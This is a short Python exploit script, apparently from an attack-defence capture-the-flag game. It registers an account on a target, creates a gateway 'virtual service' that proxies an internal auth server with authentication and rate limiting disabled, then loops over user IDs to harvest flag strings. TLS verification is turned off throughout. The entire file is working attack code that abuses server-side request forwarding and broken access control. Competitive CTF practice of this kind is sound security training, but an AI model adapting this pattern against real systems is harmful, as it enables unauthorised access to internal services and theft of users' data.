import requests
import hashlib
import sys
import urllib3
import re
import random
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

host = sys.argv[1]
flag_re = re.compile(r"TEAM\d{3}_[A-Z0-9]{32}")
#flag_re = re.compile(r"[A-Z0-9]{31}=")


def get_str() -> str:
    return ''.join(random.choices(string.ascii_letters, k=10))

username = get_str()
password = get_str()

session = requests.Session()

session.post(
    f"https://{host}/auth/auth/register", 
    json={"username": username, "email": f"{username}@example.com", "password": password, "bio":""}, 
    verify=False
    )

token = session.post(
    f"https://{host}/auth/auth/login",
    json={"username": username, "password": password},
    verify=False
    ).json()["token"]



session.headers.update({"Authorization": f"Bearer {token}"})
slug = get_str().lower()
backend_url = "http://warehouse-auth-server:8081/users"
resp = session.post(
    f"https://{host}/gateway/api/virtual-services", 
    json={ 
        "name": slug, "slug": slug, "backend_url": backend_url,
        "require_auth": False, "ti_mode": "disabled", "rate_limit_enabled": False,
        "rate_limit_requests": 100,"rate_limit_window_sec": 60,"log_retention_minutes": 60
    },
    verify=False
    )

users = session.get(f"https://{host}/auth/users?limit=20&offset=0", verify=False).json()["users"]
for user in users:
    resp = session.get(f"https://{host}/gateway/vs/{slug}/search?query={user['id']}", verify=False)
    if resp.status_code == 200:
        if flags := ', '.join(flag_re.findall(resp.text)):
            print(f"[+] Found flags: {flags}")

print("[+] Completed")
        
